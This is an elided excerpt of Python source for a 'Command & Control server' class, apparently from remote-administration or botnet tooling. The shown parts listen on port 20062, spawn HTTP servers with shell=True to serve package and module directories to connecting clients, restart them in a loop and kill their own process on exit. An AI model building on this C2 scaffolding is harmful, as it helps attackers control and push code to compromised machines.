...
class C2(threading.Thread):
    ...
    def __init__(self, host='0.0.0.0', port=20062, debug=True):
        """
        Create a new Command & Control server

        `Optional`
        :param str host:    IP address  (defaut: 0.0.0.0)
        :param int port:    Port number (default: 20062)
    ...
    def _setup_server(self):
        ...
        try:
            ...
            globals()['package_handler'] = subprocess.Popen(
                '{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 2), 0, None, subprocess.PIPE,
                stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
            ...
            globals()['module_handler'] = subprocess.Popen(
                '{0} -m {1} {2}'.format(sys.executable, http_serv_mod, self.port + 1), 0, None, subprocess.PIPE,
                stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
    ...
    def quit(self):
        ...
        _ = os.popen(
            "taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill {}".format(os.getpid())).read()
        util.log('Exiting...')
        sys.exit(0)
    ...
    def serve_resources(self):
        ...
        while True:
            ...
            globals()['package_handler'].terminate()
            globals()['package_handler'] = subprocess.Popen(
                '{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE,
                subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
    ...
    def run(self):
        ...
        if self.debug:
            util.display(
                'parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
